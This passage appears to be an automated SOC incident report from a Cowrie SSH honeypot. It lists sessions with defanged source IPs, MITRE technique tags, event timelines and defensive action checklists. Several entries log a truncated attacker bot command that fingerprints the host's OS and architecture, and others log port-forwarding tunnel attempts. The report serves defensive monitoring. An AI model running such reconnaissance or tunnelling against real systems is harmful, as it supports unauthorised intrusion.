| `2026-08-10 04:15:29` | `cowrie.command.input` |
| `2026-08-10 04:15:29` | `cowrie.command.input` |
| `2026-08-10 04:15:30` | `cowrie.log.closed` |
| `2026-08-10 04:15:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.40.20[.]65` to AbuseIPDB if not already reported
- [ ] Block `121.40.20[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0fbefe2ca4bb

| Field | Detail |
|---|---|
| **Source IP** | `207.175.35[.]41` |
| **First Seen** | 2026-08-10 04:16 |
| **Last Seen** | 2026-08-10 04:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 04:16:35` | `cowrie.session.connect` |
| `2026-08-10 04:16:35` | `cowrie.login.success` |
| `2026-08-10 04:16:36` | `cowrie.session.params` |
| `2026-08-10 04:16:36` | `cowrie.command.input` |
| `2026-08-10 04:16:36` | `cowrie.command.input` |
| `2026-08-10 04:16:36` | `cowrie.command.failed` |
| `2026-08-10 04:16:36` | `cowrie.command.input` |
| `2026-08-10 04:16:36` | `cowrie.log.closed` |
| `2026-08-10 04:16:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.175.35[.]41` to AbuseIPDB if not already reported
- [ ] Block `207.175.35[.]41` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffa4827c7605

| Field | Detail |
|---|---|
| **Source IP** | `207.175.35[.]41` |
| **First Seen** | 2026-08-10 04:16 |
| **Last Seen** | 2026-08-10 04:16 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 04:16:49` | `cowrie.session.connect` |
| `2026-08-10 04:16:49` | `cowrie.login.success` |
| `2026-08-10 04:16:49` | `cowrie.session.params` |
| `2026-08-10 04:16:49` | `cowrie.command.input` |
| `2026-08-10 04:16:49` | `cowrie.command.failed` |
| `2026-08-10 04:16:58` | `cowrie.log.closed` |
| `2026-08-10 04:16:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.175.35[.]41` to AbuseIPDB if not already reported
- [ ] Block `207.175.35[.]41` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-108750257313

| Field | Detail |
|---|---|
| **Source IP** | `207.175.35[.]41` |
| **First Seen** | 2026-08-10 04:16 |
| **Last Seen** | 2026-08-10 04:16 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 04:16:51` | `cowrie.session.connect` |
| `2026-08-10 04:16:51` | `cowrie.login.success` |
| `2026-08-10 04:16:51` | `cowrie.session.params` |
| `2026-08-10 04:16:51` | `cowrie.command.input` |
| `2026-08-10 04:16:58` | `cowrie.log.closed` |
| `2026-08-10 04:16:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.175.35[.]41` to AbuseIPDB if not already reported
- [ ] Block `207.175.35[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8bc2186dc1f

| Field | Detail |
|---|---|
| **Source IP** | `111.171.125[.]94` |
| **First Seen** | 2026-08-10 04:17 |
| **Last Seen** | 2026-08-10 04:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 04:17:26` | `cowrie.session.connect` |
| `2026-08-10 04:17:27` | `cowrie.client.version` |
| `2026-08-10 04:17:27` | `cowrie.client.kex` |
| `2026-08-10 04:17:29` | `cowrie.login.success` |
| `2026-08-10 04:17:29` | `cowrie.direct-tcpip.request` |
| `2026-08-10 04:17:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.171.125[.]94` to AbuseIPDB if not already reported
- [ ] Block `111.171.125[.]94` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64abf22675e9

| Field | Detail |
|---|---|
| **Source IP** | `39.164.94[.]190` |
| **First Seen** | 2026-08-10 04:17 |
| **Last Seen** | 2026-08-10 04:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 04:17:39` | `cowrie.session.connect` |
| `2026-08-10 04:17:39` | `cowrie.client.version` |
| `2026-08-10 04:17:39` | `cowrie.client.kex` |
| `2026-08-10 04:17:42` | `cowrie.login.success` |
| `2026-08-10 04:17:42` | `cowrie.direct-tcpip.request` |
| `2026-08-10 04:17:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `39.164.94[.]190` to AbuseIPDB if not already reported
- [ ] Block `39.164.94[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2decef47887e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-10 04:19 |
| **Last Seen** | 2026-08-10 04:19 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 04:19:25` | `cowrie.session.connect` |
| `2026-08-10 04:19:26` | `cowrie.client.version` |
| `2026-08-10 04:19:26` | `cowrie.client.kex` |
| `2026-08-10 04:19:29` | `cowrie.login.success` |
| `2026-08-10 04:19:30` | `cowrie.session.params` |
| `2026-08-10 04:19:30` | `cowrie.command.input` |
| `2026-08-10 04:19:30` | `cowrie.command.input` |
| `2026-08-10 04:19:30` | `cowrie.command.input` |
| `2026-08-10 04:19:30` | `cowrie.command.input` |
| `2026-08-10 04:19:30` | `cowrie.command.input` |
| `2026-08-10 04:19:30` | `cowrie.command.success` |
| `2026-08-10 04:19:30` | `cowrie.command.input` |
| `2026-08-10 04:19:30` | `cowrie.command.input` |
| `2026-08-10 04:19:30` | `cowrie.command.input` |
| `2026-08-10 04:19:30` | `cowrie.command.input` |
| `2026-08-10 04:19:30` | `cowrie.log.closed` |
| `2026-08-10 04:19:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e15597b5b48d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-10 04:21 |
| **Last Seen** | 2026-08-10 04:21 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 04:21:46` | `cowrie.session.connect` |
| `2026-08-10 04:21:47` | `cowrie.client.version` |
| `2026-08-10 04:21:47` | `cowrie.client.kex` |
| `2026-08-10 04:21:50` | `cowrie.login.success` |
| `2026-08-10 04:21:51` | `cowrie.session.params` |
| `2026-08-10 04:21:51` | `cowrie.command.input` |
| `2026-08-10 04:21:51` | `cowrie.command.input` |
| `2026-08-10 04:21:51` | `cowrie.command.input` |
| `2026-08-10 04:21:51` | `cowrie.command.input` |
| `2026-08-10 04:21:51` | `cowrie.command.input` |
| `2026-08-10 04:21:51` | `cowrie.command.success` |
| `2026-08-10 04:21:51` | `cowrie.command.input` |
| `2026-08-10 04:21:51` | `cowrie.command.input` |
| `2026-08-10 04:21:51` | `cowrie.command.input` |
| `2026-08-10 04:21:51` | `cowrie.command.input` |
| `2026-08-10 04:21:51` | `cowrie.log.closed` |
| `2026-08-10 04:21:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b80fdfd30b93

| Field | Detail |
|---|---|
| **Source IP** | `59.48.39[.]222` |
| **First Seen** | 2026-08-10 04:23 |
| **Last Seen** | 2026-08-10 04:23 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 04:23:19` | `cowrie.session.connect` |
| `2026-08-10 04:23:20` | `cowrie.client.version` |
| `2026-08-10 04:23:20` | `cowrie.client.kex` |
| `2026-08-10 04:23:22` | `cowrie.login.success` |
| `2026-08-10 04:23:23` | `cowrie.direct-tcpip.request` |
| `2026-08-10 04:23:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.48.39[.]222` to AbuseIPDB if not already reported
- [ ] Block `59.48.39[.]222` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95a54a4c710c

| Field | Detail |
|---|---|
| **Source IP** | `87.103.126[.]54` |
| **First Seen** | 2026-08-10 04:23 |
| **Last Seen** | 2026-08-10 04:23 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 04:23:32` | `cowrie.session.connect` |
| `2026-08-10 04:23:33` | `cowrie.client.version` |
| `2026-08-10 04:23:33` | `cowrie.client.kex` |
| `2026-08-10 04:23:33` | `cowrie.login.success` |
| `2026-08-10 04:23:34` | `cowrie.direct-tcpip.request` |
| `2026-08-10 04:23:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.103.126[.]54` to AbuseIPDB if not already reported
- [ ] Block `87.103.126[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c7ffb5c97d2

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-10 04:24 |
| **Last Seen** | 2026-08-10 04:24 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 04:24:07` | `cowrie.session.connect` |
| `2026-08-10 04:24:07` | `cowrie.client.version` |
| `2026-08-10 04:24:07` | `cowrie.client.kex` |
| `2026-08-10 04:24:09` | `cowrie.login.success` |
| `2026-08-10 04:24:10` | `cowrie.session.params` |
| `2026-08-10 04:24:10` | `cowrie.command.input` |
| `2026-08-10 04:24:10` | `cowrie.command.input` |
| `2026-08-10 04:24:10` | `cowrie.command.input` |
| `2026-08-10 04:24:10` | `cowrie.command.input` |
| `2026-08-10 04:24:10` | `cowrie.command.input` |
| `2026-08-10 04:24:10` | `cowrie.command.success` |
| `2026-08-10 04:24:10` | `cowrie.command.input` |
| `2026-08-10 04:24:10` | `cowrie.command.input` |
| `2026-08-10 04:24:10` | `cowrie.command.input` |
| `2026-08-10 04:24:10` | `cowrie.command.input` |
| `2026-08-10 04:24:11` | `cowrie.log.closed` |
| `2026-08-10 04:24:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e225c712789

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-10 04:24 |
| **Last Seen** | 2026-08-10 04:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 04:24:07` | `cowrie.session.connect` |
| `2026-08-10 04:24:07` | `cowrie.client.version` |
| `2026-08-10 04:24:08` | `cowrie.client.kex` |
| `2026-08-10 04:24:09` | `cowrie.login.success` |
| `2026-08-10 04:24:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-147b62e7d68d

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-10 04:24 |
| **Last Seen** | 2026-08-10 04:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 04:24:08` | `cowrie.session.connect` |
| `2026-08-10 04:24:08` | `cowrie.client.version` |
| `2026-08-10 04:24:08` | `cowrie.client.kex` |
| `2026-08-10 04:24:09` | `cowrie.login.success` |
| `2026-08-10 04:24:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c487dd80575

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-10 04:26 |
| **Last Seen** | 2026-08-10 04:26 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 04:26:27` | `cowrie.session.connect` |
| `2026-08-10 04:26:28` | `cowrie.client.version` |
| `2026-08-10 04:26:28` | `cowrie.client.kex` |
| `2026-08-10 04:26:31` | `cowrie.login.success` |
| `2026-08-10 04:26:32` | `cowrie.session.params` |
| `2026-08-10 04:26:32` | `cowrie.command.input` |
| `2026-08-10 04:26:32` | `cowrie.command.input` |
| `2026-08-10 04:26:32` | `cowrie.command.input` |
| `2026-08-10 04:26:32` | `cowrie.command.input` |
| `2026-08-10 04:26:32` | `cowrie.command.input` |
| `2026-08-10 04:26:32` | `cowrie.command.success` |
| `2026-08-10 04:26:32` | `cowrie.command.input` |
| `2026-08-10 04:26:32` | `cowrie.command.input` |
| `2026-08-10 04:26:32` | `cowrie.command.input` |
| `2026-08-10 04:26:32` | `cowrie.command.input` |
| `2026-08-10 04:26:33` | `cowrie.log.closed` |
| `2026-08-10 04:26:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56219686a2c2

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-10 04:28 |
| **Last Seen** | 2026-08-10 04:28 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 04:28:44` | `cowrie.session.connect` |
| `2026-08-10 04:28:44` | `cowrie.client.version` |
| `2026-08-10 04:28:44` | `cowrie.client.kex` |
| `2026-08-10 04:28:47` | `cowrie.login.success` |
| `2026-08-10 04:28:48` | `cowrie.session.params` |
| `2026-08-10 04:28:48` | `cowrie.command.input` |
| `2026-08-10 04:28:48` | `cowrie.command.input` |
| `2026-08-10 04:28:48` | `cowrie.command.input` |
| `2026-08-10 04:28:48` | `cowrie.command.input` |
| `2026-08-10 04:28:48` | `cowrie.command.input` |
| `2026-08-10 04:28:48` | `cowrie.command.success` |
| `2026-08-10 04:28:48` | `cowrie.command.input` |
| `2026-08-10 04:28:48` | `cowrie.command.input` |
| `2026-08-10 04:28:48` | `cowrie.command.input` |
| `2026-08-10 04:28:48` | `cowrie.command.input` |
| `2026-08-10 04:28:49` | `cowrie.log.closed` |
| `2026-08-10 04:28:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7428ca3d482

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-10 04:31 |
| **Last Seen** | 2026-08-10 04:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 04:31:08` | `cowrie.session.connect` |
| `2026-08-10 04:31:08` | `cowrie.client.version` |
| `2026-08-10 04:31:08` | `cowrie.client.kex` |
| `2026-08-10 04:31:11` | `cowrie.login.success` |
| `2026-08-10 04:31:12` | `cowrie.session.params` |
| `2026-08-10 04:31:12` | `cowrie.command.input` |
| `2026-08-10 04:31:12` | `cowrie.command.input` |
| `2026-08-10 04:31:12` | `cowrie.command.input` |
| `2026-08-10 04:31:12` | `cowrie.command.input` |
| `2026-08-10 04:31:12` | `cowrie.command.input` |
| `2026-08-10 04:31:12` | `cowrie.command.success` |
| `2026-08-10 04:31:12` | `cowrie.command.input` |
| `2026-08-10 04:31:12` | `cowrie.command.input` |
| `2026-08-10 04:31:12` | `cowrie.command.input` |
| `2026-08-10 04:31:12` | `cowrie.command.input` |
| `2026-08-10 04:31:12` | `cowrie.log.closed` |
| `2026-08-10 04:31:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6551ade07b6

| Field | Detail |
|---|---|
| **Source IP** | `211.253.10[.]61` |
| **First Seen** | 2026-08-10 04:33 |
| **Last Seen** | 2026-08-10 04:33 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 04:33:10` | `cowrie.session.connect` |
| `2026-08-10 04:33:11` | `cowrie.client.version` |
| `2026-08-10 04:33:11` | `cowrie.client.kex` |
| `2026-08-10 04:33:13` | `cowrie.login.success` |
| `2026-08-10 04:33:14` | `cowrie.direct-tcpip.request` |
| `2026-08-10 04:33:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.253.10[.]61` to AbuseIPDB if not already reported
- [ ] Block `211.253.10[.]61` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2bb970149fc5

| Field | Detail |
|---|---|
| **Source IP** | `187.126.105[.]42` |
| **First Seen** | 2026-08-10 04:33 |
| **Last Seen** | 2026-08-10 04:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 04:33:20` | `cowrie.session.connect` |
| `2026-08-10 04:33:20` | `cowrie.client.version` |
| `2026-08-10 04:33:20` | `cowrie.client.kex` |
| `2026-08-10 04:33:22` | `cowrie.login.success` |
| `2026-08-10 04:33:23` | `cowrie.direct-tcpip.request` |
| `2026-08-10 04:33:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.126.105[.]42` to AbuseIPDB if not already reported
- [ ] Block `187.126.105[.]42` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a32bf4a9f56

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-10 04:33 |
| **Last Seen** | 2026-08-10 04:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 04:33:30` | `cowrie.session.connect` |
| `2026-08-10 04:33:31` | `cowrie.client.version` |
| `2026-08-10 04:33:31` | `cowrie.client.kex` |
| `2026-08-10 04:33:33` | `cowrie.login.success` |
| `2026-08-10 04:33:34` | `cowrie.session.params` |
| `2026-08-10 04:33:34` | `cowrie.command.input` |
| `2026-08-10 04:33:34` | `cowrie.command.input` |
| `2026-08-10 04:33:34` | `cowrie.command.input` |
| `2026-08-10 04:33:34` | `cowrie.command.input` |
| `2026-08-10 04:33:34` | `cowrie.command.input` |
| `2026-08-10 04:33:34` | `cowrie.command.success` |
| `2026-08-10 04:33:34` | `cowrie.command.input` |
| `2026-08-10 04:33:34` | `cowrie.command.input` |
| `2026-08-10 04:33:34` | `cowrie.command.input` |
| `2026-08-10 04:33:34` | `cowrie.command.input` |
| `2026-08-10 04:33:34` | `cowrie.log.closed` |
| `2026-08-10 04:33:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
